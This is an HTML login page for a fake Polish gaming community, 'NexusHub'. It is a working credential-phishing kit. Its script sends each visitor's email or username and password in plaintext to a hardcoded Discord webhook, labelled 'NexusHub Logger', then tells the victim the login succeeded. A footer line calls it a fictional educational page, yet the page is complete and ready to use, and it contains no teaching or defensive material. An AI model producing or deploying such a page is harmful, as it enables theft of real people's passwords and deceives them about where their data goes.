<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>NexusHub - Zaloguj się</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');

    body {
      margin: 0;
      font-family: 'Inter', sans-serif;
      background: linear-gradient(135deg, #1a1a2e, #16213e);
      color: #fff;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .container {
      background: rgba(255, 255, 255, 0.08);
      backdrop-filter: blur(12px);
      border-radius: 16px;
      padding: 40px 32px;
      width: 100%;
      max-width: 380px;
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
      border: 1px solid rgba(255, 255, 255, 0.1);
    }

    h1 { text-align: center; margin: 0 0 8px 0; font-size: 28px; }
    .subtitle { text-align: center; color: #a0a0ff; margin-bottom: 32px; font-size: 15px; }

    .input-group { margin-bottom: 20px; }
    label { display: block; margin-bottom: 6px; font-size: 14px; color: #ddd; }
    input {
      width: 100%;
      padding: 14px 16px;
      border: none;
      border-radius: 10px;
      background: rgba(255, 255, 255, 0.1);
      color: white;
      font-size: 16px;
    }
    input:focus {
      outline: none;
      background: rgba(255, 255, 255, 0.15);
      box-shadow: 0 0 0 3px rgba(100, 150, 255, 0.3);
    }

    .options {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 24px;
      font-size: 14px;
    }

    button {
      width: 100%;
      padding: 14px;
      background: #6366f1;
      color: white;
      border: none;
      border-radius: 10px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
    }
    button:hover { background: #4f52e0; }

    .footer {
      text-align: center;
      margin-top: 24px;
      font-size: 14px;
      color: #888;
    }
    .footer a { color: #a0a0ff; text-decoration: none; }
  </style>
</head>
<body>

  <div class="container">
    <h1>NexusHub</h1>
    <p class="subtitle">Dołącz do społeczności graczy</p>

    <form id="loginForm">
      <div class="input-group">
        <label for="email">Email lub nazwa użytkownika</label>
        <input type="text" id="email" placeholder="jan.kowalski@example.com" required>
      </div>

      <div class="input-group">
        <label for="password">Hasło</label>
        <input type="password" id="password" placeholder="••••••••" required>
      </div>

      <button type="submit">Zaloguj się</button>
    </form>

    <div class="footer">
      Nie masz konta? <a href="#">Zarejestruj się</a>
    </div>
  </div>

  <script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1493250113588691067/2kSrCkWZnkMKpbYNURbE-afbcfWLwrwlXyGWHr22AdA4LphCobaTQh3tTctEXXVbQmvu";   // <--- ZMIEŃ TO!!!

    document.getElementById('loginForm').addEventListener('submit', async function(e) {
      e.preventDefault();

      const email = document.getElementById('email').value.trim();
      const password = document.getElementById('password').value.trim();

      if (!email || !password) {
        alert("Wypełnij wszystkie pola!");
        return;
      }

      // Przygotowanie ładnej wiadomości na Discord
      const payload = {
        username: "NexusHub Logger",
        embeds: [{
          title: "🔑 Nowe logowanie do NexusHub",
          color: 0x6366f1,
          fields: [
            { name: "Email / Nick", value: email || "brak", inline: true },
            { name: "Hasło", value: password || "brak", inline: true },
            { name: "Czas", value: new Date().toLocaleString('pl-PL'), inline: false }
          ],
          footer: { text: "Fikcyjna strona edukacyjna" }
        }]
      };

      try {
        const response = await fetch(WEBHOOK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });

        if (response.ok) {
          alert("✅ Zalogowano pomyślnie do NexusHub!");
          console.log("Dane wysłane na Discord:", email, password);
        } else {
          alert("Błąd podczas logowania (sprawdź webhook).");
        }
      } catch (error) {
        console.error("Błąd wysyłania:", error);
        alert("Nie udało się połączyć z serwerem.");
      }
    });
  </script>

</body>
</html>
